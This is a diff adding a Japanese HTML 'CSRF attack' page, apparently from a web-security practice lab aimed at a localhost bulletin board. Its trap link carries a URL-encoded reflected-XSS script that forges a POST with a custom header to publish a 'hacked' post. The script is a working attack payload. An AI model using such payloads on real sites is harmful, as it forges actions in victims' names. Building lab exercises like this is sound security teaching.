@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF攻撃</title>
+</head>
+<body>
+    <h1>CSRF攻撃ページ</h1>
+    <p>このページを訪れると、不正な投稿が行われます。</p>
+    <a href="http://localhost:6001/6/bulletin_board.php?keyword=%3Cscript%3E%0A%20%20%20%20%20%20%20%20function%20csrfAttackWithCustomHeader%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20xhr%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20xhr.open%28%27POST%27%2C%20%27post_handler.php%27%2C%20true%29%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20//%20%E3%82%AB%E3%82%B9%E3%82%BF%E3%83%A0%E3%83%98%E3%83%83%E3%83%80%E3%83%BC%E3%82%92%E8%A8%AD%E5%AE%9A%0A%20%20%20%20%20%20%20%20%20%20%20%20xhr.setRequestHeader%28%27Content-Type%27%2C%20%27application/x-www-form-urlencoded%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20xhr.setRequestHeader%28%27X-Custom-Header%27%2C%20%27CustomValue%27%29%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20xhr.onreadystatechange%20%3D%20function%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28this.readyState%20%3D%3D%3D%20XMLHttpRequest.DONE%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20console.log%28%27%E3%83%AC%E3%82%B9%E3%83%9D%E3%83%B3%E3%82%B9%E3%82%B9%E3%83%86%E3%83%BC%E3%82%BF%E3%82%B9%3A%27%2C%20this.status%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20console.log%28%27%E3%83%AC%E3%82%B9%E3%83%9D%E3%83%B3%E3%82%B9%E3%83%86%E3%82%AD%E3%82%B9%E3%83%88%3A%27%2C%20this.responseText%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20//%20%E3%83%95%E3%82%A9%E3%83%BC%E3%83%A0%E3%83%87%E3%83%BC%E3%82%BF%E3%82%92%E3%82%A8%E3%83%B3%E3%82%B3%E3%83%BC%E3%83%89%E3%81%97%E3%81%A6%E9%80%81%E4%BF%A1%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20params%20%3D%20%27title%3D%27%20%2B%20encodeURIComponent%28%27%E7%BD%A0%E3%81%8B%E3%82%89%E3%81%AE%E6%8A%95%E7%A8%BF%27%29%20%2B%20%27%26content%3D%27%20%2B%20encodeURIComponent%28%27hacked%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20xhr.send%28params%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20csrfAttackWithCustomHeader%28%29%3B%0A%3C/script%3E">罠リンク</a>
+</body>
+</html>
